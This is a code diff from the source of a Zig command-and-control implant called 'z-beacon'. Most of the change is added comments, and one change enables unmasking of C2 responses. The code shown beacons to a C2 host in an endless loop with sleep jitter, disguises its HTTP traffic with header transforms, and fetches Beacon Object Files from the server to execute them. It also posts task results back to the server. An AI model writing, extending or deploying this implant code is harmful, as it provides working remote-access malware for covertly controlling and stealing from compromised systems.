@@ -165,11 +165,16 @@ fn netHttpExchange(
     var bof_res: ?*zbeac0n.BofRes = null;
     var masked_body_len: u32 = 0;
 
+    //
+    // PREAPRE REQUEST FOR SENDING
+    //
+
     var http_reqOptions: std.http.Client.RequestOptions = .{
         .keep_alive = true,
         .connection = conn,
     };
 
+    // query C2 for new tasks
     if (connectionType == .Heartbeat) {
         http_method = .GET;
         const url = try std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint });
@@ -178,6 +183,7 @@ fn netHttpExchange(
         // apply HTTP header transforms
         _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);
 
+    // fetching for a resource as indicated in 'extra_data'
     } else if (connectionType == .ResourceFetch and extra_data != null) {
 
         // in case of ResourceFetch exchange extra_data is a  0-terminated path to the resource
@@ -191,6 +197,8 @@ fn netHttpExchange(
 
         // apply HTTP header transforms
         _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);
+
+    // returning results of an already completed task
     } else if (connectionType == .TaskResult and extra_data != null) {
         // in case of TaskResult exchange extra_data is a length len.*
 
@@ -215,24 +223,36 @@ fn netHttpExchange(
         }
     }
 
+    //
+    // SENDING REQUEST
+    //
+
     // create HTTP request
     var http_request = try http_client.request(http_method, uri, http_reqOptions);
     defer http_request.deinit();
 
+    // in case of returning tasks results we send POST request
     if (connectionType == .TaskResult and body_data != null) {
         // sends HTTP body and header
         http_request.transfer_encoding = .{ .content_length = body_data.?.len };
         try http_request.sendBodyComplete(body_data.?);
+
+    // in other cases we send GET
     } else {
-        // sends HTTP header
+        // sends HTTP header only
         try http_request.sendBodiless();
     }
+
+    //
+    // RESPONSE PROCESSING
+    //
 
     var response = try http_request.receiveHead(&.{});
     if (response.head.status != .ok) {
         return error.BadData;
     }
 
+    // get body content
     const body = try response.reader(&.{}).allocRemaining(s.allocator, .unlimited);
     errdefer s.allocator.free(body);
 
@@ -386,11 +406,16 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
 
     var is_loaded: bool = false;
     var bof_to_exec: bof.Object = undefined;
+
     // BOF was already loaded persistently and is available
     if (state.persistent_bofs.get(hash)) |b| {
         std.log.info("Re-using existing persistent BOF (hash: 0x{x})", .{hash});
         bof_to_exec = b;
         is_loaded = true;
+
+        if(!is_persistent) {
+            _ = state.persistent_bofs.remove(hash);
+        }
 
         // else: we need to fetch BOF file content from C2 sever
     } else {
@@ -724,19 +749,22 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
     std.log.info("z-beacon launched", .{});
 
     while (true) {
+
         // connect to C2 server
         const net_conn = state.implant_actions.netConnect(&state, zbeac0n.netConnectionType.Heartbeat, null);
 
         if (net_conn) |conn| {
+
+            // query C2 server for new tasks
             var body_len: u32 = 0;
             const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(&state, zbeac0n.netConnectionType.Heartbeat, conn, &body_len, null));
 
             // unmask received data and process command (if any)
             if (body_len > 0) {
-                //const unmasked_resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(&state, req_raw, resp_content, &body_len));
+                const unmasked_resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(&state, zbeac0n.netConnectionType.Heartbeat, resp_content, &body_len));
 
-                //if (unmasked_resp_content) |buf| {
-                if (resp_content) |buf| {
+                if (unmasked_resp_content) |buf| {
+                //if (resp_content) |buf| {
                     std.log.info("Before processCommands", .{});
                     processCommands(allocator, &state, buf[0..body_len]) catch {};
                     std.log.info("After processCommands", .{});
@@ -752,6 +780,7 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
         // process queued BOFs
         processPendingBofs(allocator, &state) catch {};
 
+        // go to sleep
         std.Thread.sleep(state.jitter * @as(u64, 1e9));
     }
 }
